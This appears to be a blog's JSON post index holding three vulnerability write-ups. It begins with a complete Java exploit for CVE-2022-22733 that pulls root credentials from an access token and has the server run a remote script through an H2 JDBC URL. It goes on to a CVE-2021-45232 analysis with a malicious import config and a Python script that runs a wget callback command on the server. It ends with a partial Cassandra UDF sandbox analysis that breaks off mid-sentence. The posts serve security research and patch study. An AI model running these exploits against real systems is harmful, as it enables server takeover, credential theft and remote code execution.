wr.writeBytes(requestBody); wr.flush(); wr.close();  int responseCode2 = con2.getResponseCode(); System.out.println(\"[*] JDBC Attack Response Code : \" + responseCode2); BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream())); String inputLine2 = \"\"; StringBuffer response2 = new StringBuffer();  while ((inputLine2 = in2.readLine()) != null) {     response2.append(inputLine2); } in2.close();   JSONObject jsonObject2 = new JSONObject(response2.toString()); System.out.println(\"[*] JDBC Attack Response: \" + jsonObject2);   Here is the code for our final step and it’s not a big different as we already familiar with the HTTP connection and with sending &amp; parsing response data. Now, Before we test the full code let’s add some try &amp; catch to handle exceptions &amp; also skip the SSL verifications.   Full Code:   import org.json.JSONObject; import javax.net.ssl.HttpsURLConnection; import javax.net.ssl.SSLContext; import javax.net.ssl.TrustManager; import javax.net.ssl.X509TrustManager; import java.io.BufferedReader; import java.io.DataOutputStream; import java.io.InputStreamReader; import java.net.HttpURLConnection; import java.net.URL; import java.nio.charset.StandardCharsets; import java.util.Base64; import java.util.Scanner;  public class Main {     public static void main(String[] args) {         System.out.print(\"[*] CVE-2022-22733 Exploit By: Zeyad Azima\\nWebsite: https://zeyadazima.com\\nGithub: https://github.com/Zeyad-Azima\\n\");         System.out.println(\"\");         System.out.println(\"\");         try {             Scanner scanner = new Scanner(System.in);             System.out.print(\"[+] Enter host: \");             String host = scanner.nextLine();             System.out.print(\"[+] Enter port: \");             String port = scanner.nextLine();             System.out.print(\"[+] Enter username: \");             String username = scanner.nextLine();             System.out.print(\"[+] Enter password: \");             String password = scanner.nextLine();             System.out.print(\"[+] Enter payload URL for JDBC Attack: \");             String JDBC = scanner.nextLine();             scanner.close();               String url = \"http://\" + host + \":\" + port + \"/api/login\";             URL obj = new URL(url);               TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {                 public java.security.cert.X509Certificate[] getAcceptedIssuers() {                     return null;                 }                 public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {                 }                 public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {                 }             } };             SSLContext sc = SSLContext.getInstance(\"SSL\");             sc.init(null, trustAllCerts, new java.security.SecureRandom());             HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());             HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -&gt; true);               HttpURLConnection testCon = (HttpURLConnection) obj.openConnection();             testCon.setRequestMethod(\"HEAD\");             int responseCodeTest = testCon.getResponseCode();             if (responseCodeTest != HttpURLConnection.HTTP_OK) {                 System.out.println(\"[-] Connection error: \" + responseCodeTest);                 return;             }               HttpURLConnection con = (HttpURLConnection) obj.openConnection();             con.setRequestMethod(\"POST\");             con.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\");             con.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\");             con.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");             con.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");             con.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\");             con.setRequestProperty(\"Access-Token\", \"\");             con.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port);             con.setRequestProperty(\"DNT\", \"1\");             con.setRequestProperty(\"Connection\", \"close\");             con.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\");             String body = \"{\\\"username\\\":\\\"\" + username + \"\\\",\\\"password\\\":\\\"\" + password + \"\\\"}\";             con.setDoOutput(true);             con.getOutputStream().write(body.getBytes(\"UTF-8\"));             int responseCode = con.getResponseCode();             System.out.println(\"[*] LOGIN Response Code: \" + responseCode);             BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));             String inputLine;             StringBuffer response = new StringBuffer();             while ((inputLine = in.readLine()) != null) {                 response.append(inputLine);             }             in.close();             JSONObject jsonObject = new JSONObject(response.toString());             JSONObject model = jsonObject.getJSONObject(\"model\");             String accessToken = model.getString(\"accessToken\");             //String decodedToken = new String(Base64.getDecoder().decode(accessToken));             byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));             String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);               JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);              String rootUsername = \"\";             String rootPassword = \"\";             if (decodedJsonObject.has(\"rootUsername\") &amp;&amp; decodedJsonObject.has(\"rootPassword\")) {                 rootUsername = decodedJsonObject.getString(\"rootUsername\");                 rootPassword = decodedJsonObject.getString(\"rootPassword\");                 System.out.println(\"[*] Root username: \" + rootUsername);                 System.out.println(\"[*] Root password: \" + rootPassword);             } else {                 System.out.println(\"Access token does not contain rootUsername and rootPassword keys.\");             }              // second login request with root credentials             HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();             con3.setRequestMethod(\"POST\");             con3.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\");             con3.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\");             con3.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");             con3.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");             con3.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\");             con3.setRequestProperty(\"Access-Token\", \"\");             con3.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port);             con3.setRequestProperty(\"DNT\", \"1\");             con3.setRequestProperty(\"Connection\", \"close\");             con3.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\");             String requestBody3 = \"{\\\"username\\\":\\\"\" + rootUsername + \"\\\",\\\"password\\\":\\\"\" + rootPassword + \"\\\"}\";             con3.setDoOutput(true);             con3.getOutputStream().write(requestBody3.getBytes(\"UTF-8\"));             int responseCode3 = con3.getResponseCode();             System.out.println(\"[*] Root Login Response Code: \" + responseCode3);             BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));             String inputLine3;             StringBuffer response3 = new StringBuffer();             while ((inputLine3 = in3.readLine()) != null) {                 response3.append(inputLine3);             }             in3.close();             JSONObject jsonObject3 = new JSONObject(response3.toString());             JSONObject model3 = jsonObject3.getJSONObject(\"model\");             String accessToken3 = model3.getString(\"accessToken\");             System.out.println(\"[*] Root Access Token: \" + accessToken3);              // JDBC Attack             String url2 = \"http://\" + host + \":\" + port + \"/api/data-source/connectTest\";             String requestBody = \"{\\\"name\\\":\\\"azima\\\",\\\"driver\\\":\\\"org.h2.Driver\\\",\\\"url\\\":\\\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\"+JDBC+\"'\\\",\\\"username\\\":\\\"a\\\",\\\"password\\\":\\\"a\\\"}\";              URL obj2 = new URL(url2);             HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();               con2.setRequestMethod(\"POST\");             con2.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\");             con2.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\");             con2.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");             con2.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");             con2.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\");             con2.setRequestProperty(\"Access-Token\", accessToken3);             con2.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port);             con2.setRequestProperty(\"DNT\", \"1\");             con2.setRequestProperty(\"Connection\", \"close\");             con2.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\");             con2.setDoOutput(true);               DataOutputStream wr = new DataOutputStream(con2.getOutputStream());             wr.writeBytes(requestBody);             wr.flush();             wr.close();              int responseCode2 = con2.getResponseCode();             System.out.println(\"[*] JDBC Attack Response Code : \" + responseCode2);             BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));             String inputLine2 = \"\";             StringBuffer response2 = new StringBuffer();              while ((inputLine2 = in2.readLine()) != null) {                 response2.append(inputLine2);             }             in2.close();               JSONObject jsonObject2 = new JSONObject(response2.toString());             System.out.println(\"[*] JDBC Attack Response: \" + jsonObject2);         } catch (Exception e) {             e.printStackTrace();         }     } }   And here is our full code after the edits, let’s try it out:          Conclusion   Now, We have a full chain of the steps and created our exploit. We can now use it in our next coming engement when we find Apache ShardingSphere ElasticJob-UI running. You can find the full code on my github from here.   Resources           https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/            https://github.com/Zeyad-Azima/CVE-2022-22733      ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2022_22733_exploit/",
        "teaser": "http://localhost:5000/assets/images/clgw8gocv3c580jqgbr2n9rc7.png"
      },{
        "title": "CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access & Unauth-RCE",
        "excerpt":"Introduction   Apache APISIX Dashboard before 2.10.1 is vulnerable to Unauthorized Access Vulnerability known as CVE-2021-45232, The authentication middleware was developed based on the droplet framework. But, some APIs used the gin framework directly as a results it leads for a bypass in authentication &amp; a successfully exploitation for this vulnerability let the attacker to abuse the support of executing lua script to execute commands on the server.   What is APISIX ?   Apache APISIX is a cloud native API gateway that provides high-performance and scalable API management solutions. It is built on top of the Nginx web server and provides a simple and flexible architecture for managing and securing APIs. The APISIX Dashboard is a web based user interface for managing and monitoring APISIX instances. It provides an intuitive and easy-to-use interface for configuring APIs, plugins, and routes, as well as monitoring API usage and performance.   Testing Lab   Now, It’s time to set up our lab for the analysis, I am going to use an older version for the analysis which is 2.9.0 as it’s vulnerable. We can see that apache has an official repo on github to run APISIX on docker and here we can avoid building errors and problems. First, Clone into the repo:   git clone https://github.com/apache/apisix-docker   After that, Navigate to example folder inside apisix-docker folder. Then, Open the docker-compose.yml file and replace the apisix-dashboard image with the following image:   apache/apisix-dashboard:2.9.0   Full example :   version: \"3\"  services:   apisix-dashboard:     image: apache/apisix-dashboard:2.9.0     restart: always     volumes:     - ./dashboard_conf/conf.yaml:/usr/local/apisix-dashboard/conf/conf.yaml     ports:     - \"9000:9000\"     networks:       apisix:   After that inside the example folder run the following command to start our apisix on docker:   docker-compose -p docker-apisix up -d      As it’s done let’s check the running process on docker:      Now, Let’s test if it works [IP]:9000/ for the APISIX dashboard &amp; [IP]:9080/ for the APISIX.           Dashboard                   APISIX              Static Analysis   Under the api folder in the source code, We can see the main.go which is the start of the dashboard app, By opening it we can see the following:      We can notice here it’s importing the cmd module from the manager-api package which is the cmd folder under the same folder, Then, It calls Execute() function from cmd. Therefore, We need to go to the cmd folder and check the Execute() function.      After going through the files we can see the Execute() function is in root.go. And basically, It’s executing rootCmd.Execute() and check if there is any errors returned to handle it. When we search for the rootCmd.      We can see clearly that rootCmd is a variable definition of a CLI from Cobra library which is a command-line library for Go and It provides a simple &amp; efficient way to create modern CLI applications that can handle commands, flags, and arguments. The &amp;cobra.Command function creates a new command with the specified options as the following:           Use: It’s a field specifies the name and usage of the command.            Short: It’s a field that provides a brief description of the command.            RunE: it’s field of a function that gets called when the command is executed, In our case the function it takes argument and gonna execute the manageAPI() function.       When we scroll down more under the Init() function, We can see the following lines:      We can see it’s adding persistent flags to the rootCmd and registering several sub-commands (Also can called functions) with it as the following:           newVersionCommand(): which adds a version sub-command            newInstallCommand(): which adds an install sub-command            newRemoveCommand(): which adds a remove sub-command            newStartCommand(): which adds a start sub-command            newStopCommand(): which adds a stop sub-command            newStatusCommand(): which adds a status sub-command       And all of these added sub-commands are added from the files under the same directory as we can see:      Now, Let’s go to the function that gets executed when we running the rootCmd which is the manageAPI() function:      Now, Let’s explain the function. First, it initializes the configuration and logger by calling the conf.InitConf() and log.InitLogger() functions. Then, it creates a new server object using the server.NewServer() function and assign it to the s variable which is a server type and err variable for error &amp; passing in options that include whether to force start the server or not. After that, The server is then started by calling the s.Start() function, which creates a go routine and listens for incoming HTTP requests and then sets up a quit channel that listens for an interrupt signal and if received, it stops the server gracefully by calling the s.Stop() function and exits the program &amp; If an error occurs during server startup the function logs the error and returns it. Now, When we go up to the imports line we can notice the following:      That the server is implemented from api/internal/core/server/server.go. Let’s take a look on it:      After the imports of needed modules, we can see it defines a struct of server type and it defines the HTTP server and its associated options. Then, The Options struct is used to specify the configuration options for the server. After that a function named NewServer that creates a new server manager by taking an instance of the Options struct as input and return a pointer to a server struct and an error.      In the following lines, We can see the Start() function that called before inside the mangerAPI() function.      the Start() function starts with initializing the server through s.init() and assign the error to err object &amp; if there is an error it will immediately assign it to errSig and exit. Now, After the server initialized it will print server info using s.printInfo(), Then starts the HTTP server through s.server.ListenAndServe() &amp; Then it will start the HTTP Server implemented with the SSL if it’s configured. Moving to the following lines we will be able to see the following 2 functions:      First, Which is Stop() function and basically it will close the opened connections &amp; then shutdown the server. And second, init() function which is important for us, In the function it calls s.SetupStore() which is responsible for managing data persistence for the Manager API and it can be found in store.go file under the same folder and it’s just initializing the Store. Second, the init() function also calls the s.setupAPI() and we can find the setupAPI() function inside the http.go file under the same folder:      Here the droplet framework is used, droplet.Option.Orchestrator function takes a slice of middleware and returns a new slice of middleware that will be used in the order specified. the first middleware in the slice of middleware passed in. Then the handler.ErrorTransformMiddleware{} middleware that transforms all errors returned by handlers to the standard API error format. Finally, the filter.AuthenticationMiddleware{} middleware that authenticates requests based on the access token in the Authorization header. and by defining the middleware in this way, it ensures that error transformation and authentication will be performed before any other middleware processing. So, for the following examples we gonna see how the wrong implementation done:           1st:                   2nd:              In the 1st screenshot we can see that it’s wgin.Wraps() to wrap the function with the middleware so it can it check that error transformation and authentication will be performed before any other middleware processing. But, In the second screenshot it’s not wrapping the function with the middleware. As a result we can get unauthorized access to these 2 routes which are /apisix/admin/migrate/export &amp; /apisix/admin/migrate/import. Let’s try to access a route from the wrapped ones and access the non-wrapped ones to se how the application will deal with it.           Wrapped                   Non-Wrapped              Here we can see clearly that the wrapped one give us a response that we are unauthorized. BUt, the second one which is /apisix/admin/migrate/export route exported us the current configuration of APISIX.   Dynamic Analysis   Now, It’s time for dynamic analysis. First, for debugging go applications we need to download delve debugger. You can follow the installation guide from here. Let’s now build the dashboard on our local machine to debug it. First we would need the following packages before we start building golang-go, yarn, nodejs, etcd:   sudo apt install golang-go yarn nodejs   And for installing ectd follow the installation guide from here. After the packages get installed let’s download our vulnerable version:   git clone -b release/2.9.0 https://github.com/apache/apisix-dashboard.git &amp;&amp; cd apisix-dashboard   After that run the following command sudo make build to build the app dashboard. After it’s finished Let’s go to output directory:      We can see the manager-api which is the dashboard app. Now, It’s time to execute the app using delve to debug it remote;y from our GoLand IDE. You can find delve binary under the go/bin directory under your linux user home. Let’s run delve:   sudo /home/kali/go/bin/dlv -l=:2345 --headless=true --api-version=2 --log=true exec ./manager-api   Here we run delve to execute the app and listen for debugging session on port 2345 as we can see:      Now, Let’s connect to the debugger session on our IDE, go to Run Tab and then click on Edit Configurations:      Then Click on the + add sign and choose Go Remote:      And Name it as you want &amp; configure the remote debugger, By adding the machine IP, Debugging port which is 2345:      Now, Click on OK and you can see that our remote debugger is configured:      It’s time to set a breakpoints, First we will set a breakpoint to the wrapped route and take a look how the app deal with it &amp; then the un-wrapped one to see the difference.      As we can see our debugger is running, Let’s debug our code and see how it will apply route for each one. While we stepping over under the r which is a pointer for route we can see tress which is gin.methoidTrees:      Under it we can see integer values and each number is carrying all the different routes according to the methods      Here we can see see that each the 5 HTTP methods are exist and under the root of each one, We can see the children tab which contains the exact routes:      Here we can see the routes also stored inside it. Now, As we saw the way of ApplyRoute and how it’s applying routes to initialize it, Let’s see how the difference between the wrapped route and un-wrapped route on the loading. But, This time we will add the breakpoint under the Wrap function from the gin framework:      After setting our breakpoint let’s run our debugger again and moving step by step until we arrive to the Wrap function.      Here as we can see when the breakpoint of the Wraps funtion got hit it started to Wraps it and apply the middleware to it and as the following 2 routes are not Wrapped the authentication can be bypassed as it’s gonna apply and execute it without wrapping:   r.GET(\"/apisix/admin/migrate/export\", h.ExportConfig) r.POST(\"/apisix/admin/migrate/import\", h.ImportConfig)   Exploitation   Now, How the vulnerable routes can be exploited ?. As we mentioned before that the /apisix/admin/migrate/export used to export the current configurations, The /apisix/admin/migrate/import used to import configurations. And APISIX is supporting execution of lua scripts then, we can send a request of a malicious route that executes a command then request it. The configuration file is as the following:      It contains an array of routes, each with an ID, URIs, methods, and a Lua script. Additionally, there is an array of upstreams, each with a name, type, scheme, nodes, and timeout. Also arrays for consumers, services, SSLs, global plugins, and plugin configs. Now, Let’s get our malicious configration ready:   {\"Counsumers\":[],\"Routes\":[{\"id\":\"387796883096994503\",\"create_time\":1640674554,\"update_time\":1640677637,\"uris\":[\"/rce\"],\"name\":\"rce\",\"methods\":[\"GET\",\"POST\",\"PUT\",\"DELETE\",\"PATCH\",\"HEAD\",\"OPTIONS\",\"CONNECT\",\"TRACE\"],\"script\":\"os.execute('wget http://172.16.69.246:8000/Pwn3d')\",\"script_id\":\"387796883096994503\",\"upstream_id\":\"387796832866009799\",\"status\":1}],\"Services\":[],\"SSLs\":[],\"Upstreams\":[{\"id\":\"387796832866009799\",\"create_time\":1640674524,\"update_time\":1640674524,\"nodes\":[{\"host\":\"localhost\",\"1337\":,\"weight\":1}],\"timeout\":{\"connect\":6,\"read\":6,\"send\":6},\"type\":\"roundrobin\",\"scheme\":\"http\",\"pass_host\":\"pass\",\"name\":\"testUpstream\"}],\"GlobalPlugins\":[],\"PluginConfigs\":[]}   Basically, Here we set a route named /rce and it accepts all HTTP methods &amp; Then, Under the script key we put the lua script as a command system to be executed, In this case it’s gonna request our the Pwn3d endpoint from our http server.   Normal Request:   POST /apisix/admin/migrate/import HTTP/1.1 Host: 172.16.69.246:9000 User-Agent: UserAgents Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 995 Content-Type: multipart/form-data; boundary=d63fe4d72d026b3884925933bababb59  --d63fe4d72d026b3884925933bababb59 Content-Disposition: form-data; name=\"mode\"  overwrite --d63fe4d72d026b3884925933bababb59 Content-Disposition: form-data; name=\"file\"; filename=\"test\"  {\"Counsumers\": [], \"Routes\": [{\"id\": \"387796883096994503\", \"create_time\": 1640674554, \"update_time\": 1640677637, \"uris\": [\"/rce\"], \"name\": \"rce\", \"methods\": [\"GET\", \"POST\", \"PUT\", \"DELETE\", \"PATCH\", \"HEAD\", \"OPTIONS\", \"CONNECT\", \"TRACE\"], \"script\": \"os.execute('wget http://172.16.69.246:8000/Pwn3d')\", \"script_id\": \"387796883096994503\", \"upstream_id\": \"387796832866009799\", \"status\": 1}], \"Services\": [], \"SSLs\": [], \"Upstreams\": [{\"id\": \"387796832866009799\", \"create_time\": 1640674524, \"update_time\": 1640674524, \"nodes\": [{\"host\": \"10.18.134.63\", \"port\": 58344, \"weight\": 1}], \"timeout\": {\"connect\": 6, \"read\": 6, \"send\": 6}, \"type\": \"roundrobin\", \"scheme\": \"http\", \"pass_host\": \"pass\", \"name\": \"testUpstream\"}], \"GlobalPlugins\": [], \"PluginConfigs\": []}\u00106\u0015ó --d63fe4d72d026b3884925933bababb59--   Here is our python code to send the request:   import requests import json import zlib  url = \"http://172.16.69.246:9000\" gateway_url = \"http://172.16.69.246:9080\" cmd = \"wget http://172.16.69.246:8000/Pwn3d\"  def exploit(url, gateway_url, cmd):     payload, err = gen(cmd)     if err is not None:         print(err)         return     create_route(payload, url)     request_endpoint(gateway_url)  def request_endpoint(gateway_url):     res = requests.get(gateway_url + \"/rce\")     print(res.text)  def create_route(payload, url):     files = {         'file': ('test', payload)     }     data = {         'mode': 'overwrite'     }     res = requests.post(url + '/apisix/admin/migrate/import', files=files, data=data)     print(res.text)  def gen(cmd):     data = {         \"Counsumers\": [],         \"Routes\": [             {                 \"id\": \"387796883096994503\",                 \"create_time\": 1640674554,                 \"update_time\": 1640677637,                 \"uris\": [\"/rce\"],                 \"name\": \"rce\",                 \"methods\": [                     \"GET\",                     \"POST\",                     \"PUT\",                     \"DELETE\",                     \"PATCH\",                     \"HEAD\",                     \"OPTIONS\",                     \"CONNECT\",                     \"TRACE\"                 ],                 \"script\": f\"os.execute('{cmd}')\",                 \"script_id\": \"387796883096994503\",                 \"upstream_id\": \"387796832866009799\",                 \"status\": 1             }         ],         \"Services\": [],         \"SSLs\": [],         \"Upstreams\": [             {                 \"id\": \"387796832866009799\",                 \"create_time\": 1640674524,                 \"update_time\": 1640674524,                 \"nodes\": [                     {                         \"host\": \"localhost\",                         \"port\": 1337,                         \"weight\": 1                     }                 ],                 \"timeout\": {                     \"connect\": 6,                     \"read\": 6,                     \"send\": 6                 },                 \"type\": \"roundrobin\",                 \"scheme\": \"http\",                 \"pass_host\": \"pass\",                 \"name\": \"testUpstream\"             }         ],         \"GlobalPlugins\": [],         \"PluginConfigs\": []     }      json_data = json.dumps(data).encode('utf-8')     checksum = zlib.crc32(json_data).to_bytes(4, byteorder='big')     content = json_data + checksum      import_data = content[:-4]     checksum2 = int.from_bytes(content[-4:], byteorder='big')     if checksum2 != zlib.crc32(import_data):         return None, \"Checksum check failure,maybe file broken\"      return content, None  exploit(url, gateway_url, cmd)   And now let’s try to execute or code and check it out:      Patch Diffing   Now, Let’s take a look at the patch that used to prevent the vulnerability, We can see the patch information on githubfrom here. The changes applied to a lot of files, So we will be focusing on the important ones.   api/internal/core/server/http.go      The AuthenticationMiddleware middleware from the filter package was removed and the ErrorTransformMiddleware middleware from the handler package was added as the ErrorTransformMiddleware middleware from the handler package may be more suitable for catching errors.   api/internal/filter/authentication.go      Here we can see the new implementation uses gin.Context instead of droplet.Context and basically, it’s refactoring the AuthenticationMiddleware into a gin.HandlerFunc function. The changes done as the following,The BaseMiddleware is no longer used ansd replaced with gin to handle the middleware stack, Then Handle() method is replaced with a function which returns a gin.HandlerFunc to Authentication(). httpReq := ctx.Get(middleware.KeyHttpRequest) and req := httpReq.(*http.Request) replaced with c.Request. So, instead of retrieving the request object from the droplet.Context using ctx.Get(middleware.KeyHttpRequest) and httpReq.(*http.Request), the http.Request object is directly retrieved from the gin.Context object using c.Request. Also, the response object is replaced with a gin.H object which is a shorthand for creating JSON responses.Finally, the AbortWithStatusJSON() method is used to return the response with an HTTP status code.   api/internal/route.go      Here this change is to add authentication to the gin application. By inserting the filter.Authentication() middleware into the middleware chain and the application will first check if the user is authenticated before allowing them to access protected routes. If the user is not authenticated, they will receive an unauthorized response. If the user is authenticated, the middleware chain will continue to execute and the request will be handled normally.   Finally, The other changes is for test cases like upstream, route and so on.   Conclusion   We analyzed the the vulnerability and highlited the root cause of it, We show it dynamically how the routes get initialized and Also how the wrapped ones get wrapped by the Wraps() function to apply the middleware for it, And how the issue was caused by using the gin framework directly without Wrapping it when handling the routes of the configurations and finally, achieving RCE from it.   Resources           https://github.com/apache/apisix-dashboard            https://github.com/apache/apisix-docker            https://www.jetbrains.com/go/            https://github.com/go-delve/delve/tree/master/Documentation/installation            https://etcd.io/docs/v3.4/install/            https://apisix.apache.org/docs/apisix/getting-started/            https://apisix.apache.org/docs/dashboard/USER_GUIDE/            https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd#diff-a16bc2c469646367bf6d9f635ee85a8e13109732bdb0caba8cec71f015bc0c1c      ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2021_45232/",
        "teaser": "http://localhost:5000/assets/images/clhc9my2s6ttg0jmr3ix23phb.png"
      },{
        "title": "CVE-2021-44521: Apache Cassandra Remote Code Execution",
        "excerpt":"Introduction   CVE-2021-44521 is a vulnerability discovered in Apache Cassandra which allow an attacker to achieve remote command execution through UDFS &amp; bypass the sandbox to execute the code on the server under specific configurations which let the attacker to takeover the server.   CVSS:(Critical) https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44521&amp;vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&amp;version=3.1&amp;source=NIST   What is Apache Cassandra ?   Apache Cassandra is an open-source distributed NoSQL database management system, Cassandra is highly scalable and can handle large amounts of structured, semi-structured, and unstructured data across multiple data centers, making it a popular choice for big data applications. It uses a decentralized architecture, with no master node, which allows for linear scalability and fault tolerance. Also, It’s highly tunable and configurable, allowing developers to adjust the system to their specific use case and workload.   CQL   CQL is a short for Cassandra Query Language, Which is a query language similar to SQL, but optimized for distributed database environments with support for secondary indexes, materialized views, and batch operations, among other features.   UDFs   UDFs is a short for User-Defined Functions which are functions that can be created and executed by users within a database management system. In our case, Cassandra offers the functionality of creating user-defined-functions (UDFs) &amp; the UDFs in Cassandra can be written by default in Java and JavaScript.   Nashorn   Nashorn is a JavaScript engine that was introduced in Java 8 and it allows users to execute JavaScript code within a sanbox &amp; It can be used to create and execute JavaScript based UDFs in Java based database management systems by executing it inside of a sandbox.   Testing Lab   Now, Let’s setup our testing lab for analysis &amp; We gonna be using Cassandra 4.0.0, But we need to do some modification for the configuration file within the container and create a new image from it then start a container based on our modified one. First we will pull the Cassandra image:   docker pull cassandra:4.0.0      Now let’s run cassandra container:   sudo docker run --name my-cassandra-analysis -d cassandra:4.0.0      Let’s check if the container is running:   sudo docker ps -a      We can see the container is running, Now, Let’s open a shell to it and start our modifications:   sudo docker exec -it CONTAINER_ID bash      Now, Under /opt/cassandar we can find the cassandra.yaml:      Let’s open cassandra.yaml and modifiy &amp; add the following lines:   enable_user_defined_functions: true enable_scripted_user_defined_functions: true enable_user_defined_functions_threads: false   After this save the file and exit the shell. And the time for creating image from our container is came:   sudo docker commit my-cassandra-4.0.0 cassandra-analysis:latest       Now, Everything is ready let’s stop the continer and run a new one using our modified image:   sudo docker run --name my-cassandra-analysis -e \"JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n\" -p 8000:8000 -d cassandra-analysis:latest      The -e JAVA_TOOL_OPTIONS=\"-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n\" is to set a debugging port, So we can perform our dynamic analysis later and the -p 8000:8000 to map the external connections of port 8000 into the container. Now, If we execute shell on the container &amp; try to see the configuration file of cassandra.yaml we can see our modified configurations applied:      Static Analysis   If we go again to cassandra.yaml file we can be able to see that the anonymous access is allowed as authenticator config is set as the following:   authenticator: AllowAllAuthenticator   And if we go to the cassandra source code we can find a call called AllowAllAuthenticator under the following path /src/java/org/apache/cassandra/auth, Let’s take a look and check it out:   public class AllowAllAuthenticator implements IAuthenticator {     private static final SaslNegotiator AUTHENTICATOR_INSTANCE = new Negotiator();      public boolean requireAuthentication()     {         return false;     }      public Set&lt;IResource&gt; protectedResources()     {         return Collections.emptySet();     }      public void validateConfiguration() throws ConfigurationException     {     }      public void setup()     {     }      public SaslNegotiator newSaslNegotiator(InetAddress clientAddress)     {         return AUTHENTICATOR_INSTANCE;     }      public AuthenticatedUser legacyAuthenticate(Map&lt;String, String&gt; credentialsData)     {         return AuthenticatedUser.ANONYMOUS_USER;     }      private static class Negotiator implements SaslNegotiator     {          public byte[] evaluateResponse(byte[] clientResponse) throws AuthenticationException         {             return null;         }          public boolean isComplete()         {             return true;         }          public AuthenticatedUser getAuthenticatedUser() throws AuthenticationException         {             return AuthenticatedUser.ANONYMOUS_USER;         }     } }   The class implements the IAuthenticator interface which is responsible for authenticating clients connecting to cassandra, the class providing a simple authentication mechanism that allows all connections without need for any credentials, In short words, Anonymous authentication.Let’s see the intreasted functions as steps happen as the following The requireAuthentication() function indicates whether authentication is required or no. In this case, it returns false which means authentication is not required. Then protectedResources() method returns a set of protected resources &amp; since there is no authentication it returns an empty set. After that legacyAuthenticate() function is used for legacy authentication and It accepts credentials data and returns an AuthenticatedUser instance. In this case, it always returns the ANONYMOUS_USER from the AuthenticatedUser class. Now, If we try to access cassandra we will be able to see that we logged-in without any asking for credentials:          Here we can see we are on cassandra without any asking for credentials. Now, Back to our configurationsm Let’s explain each option in the configurations we apply to understand it more clearly.   enable_user_defined_functions &amp; enable_scripted_user_defined_functions   The enable_user_defined_functions &amp; enable_scripted_user_defined_functions options are for enabling the support of UDFs in both Java and Javascript. Now, If we go to src/java/org/apache/cassandra/cql3/functions/UDFunction.java and take a look on the UDFs get implementaion. The UDFunction class provides methods for validating the UDFs configuration and parameters and ensure that the function definition is correct and compatible with the expected data types.          Here first we can see that UDFunction class is declared as abstract and extends the AbstractFunction class &amp; implements the ScalarFunction and SchemaElement interfaces. Them, defines a variable called logger from LoggerFactory to log messages, After that a threadMXBean variable that provides access to the thread management and monitoring MXBean. Finally, Declaring the follwoing variables:           argNames: A list of ColumnIdentifier objects representing the names of the function arguments.            language and body: Strings representing the language and body of the user-defined function.            argCodecs: An array of TypeCodec Object representing the argument codecs for the function.            returnCodec: A TypeCodec Object representing the return codec for the function.            calledOnNullInput: A boolean indicating whether the function is called on null input.            udfContext: A variable of type UDFContext which provides context information for the UDF.          By scrolling more down we can find here a variable named allowedPatterns which is an array used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the allowed classes/resources that can be loaded by the class loader. Moving to the following lines:          Here we can see a variable named disallowedPatterns which is an array used for the opposite process of allowedPatterns, Which here the disallowedPatterns used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the disallowed classes/resources that can’t be loaded by the class loader.          In the next lines we can see the following clearly, This is a static function named secureResource &amp; basically, it’s used to determine whether a given resource is considered secure based on the allowed and disallowed patterns specified in the allowedPatterns and disallowedPatterns arrays. First, the function takes a parameter named resource and as we can guess it will be the required resources to be loaded, After that defines a While loop to remove forward slashes / from the resource string by repeatedly calling substring(1) until the forward slashes are eliminated, Then a for-each loop happens to iterate through the allowedPatterns array to check if the resource starts with any of the allowed patterns and If the resource starts with an allowed pattern it will proceed to check if it is explicitly disallowed by iterating through 